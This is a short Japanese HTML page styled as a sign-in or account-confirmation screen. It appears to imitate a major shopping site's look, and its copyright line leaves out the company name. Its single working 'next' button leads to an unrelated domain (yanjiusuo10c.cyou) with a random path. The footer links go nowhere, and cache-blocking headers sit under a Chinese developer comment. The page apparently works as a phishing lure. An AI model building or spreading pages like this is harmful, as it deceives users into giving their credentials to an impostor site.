<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- 最强禁止缓存 ↓↓↓ 这部分是新加的 -->
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">

<title>確認ページ</title>
<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

body {
  background: #eaeded;
  font-family: Arial, "Helvetica Neue", sans-serif;
  color: #111;
}

.wrap {
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 24px 16px;
}

.card {
  width: 100%;
  max-width: 430px;
  background: #fff;
  border-radius: 8px;
  padding: 30px 26px;
  box-shadow: 0 2px 10px rgba(0, 0, 0, .12);
}

h1 {
  margin: 0 0 14px;
  font-size: 22px;
  font-weight: 500;
}

p {
  margin: 0 0 24px;
  font-size: 14px;
  line-height: 1.7;
  color: #333;
}

.btn {
  display: block;
  width: 100%;
  text-align: center;
  background: linear-gradient(#ffd814, #f7ca00);
  border: 1px solid #f2c200;
  border-radius: 8px;
  color: #111;
  text-decoration: none;
  padding: 13px 18px;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
  transition: opacity 0.2s;
}

.btn:hover {
  opacity: 0.9;
}

.note {
  margin-top: 18px;
  padding-top: 16px;
  border-top: 1px solid #e6e6e6;
  font-size: 12px;
  color: #666;
  text-align: center;
  line-height: 1.8;
}
.note a{
  color:#0066c0;
  text-decoration:none;
  margin:0 4px;
}
</style>
</head>
<body>

<div class="wrap">
  <div class="card">
    <h1>サインインまたはアカウントを作成</h1>
    <p>続きの内容は、下のボタンからご確認いただけます。</p>
    <a class="btn" href="https://yanjiusuo10c.cyou/kdgGFF45uit" rel="noopener noreferrer">次へ</a>
    <div class="note">
      <a href="#">利用規約</a>
      <a href="#">プライバシー規約</a>
      <a href="#">ヘルプ</a>
      <br>© 1996-2026、又はその関連会社
    </div>
  </div>
</div>

</body>
</html>
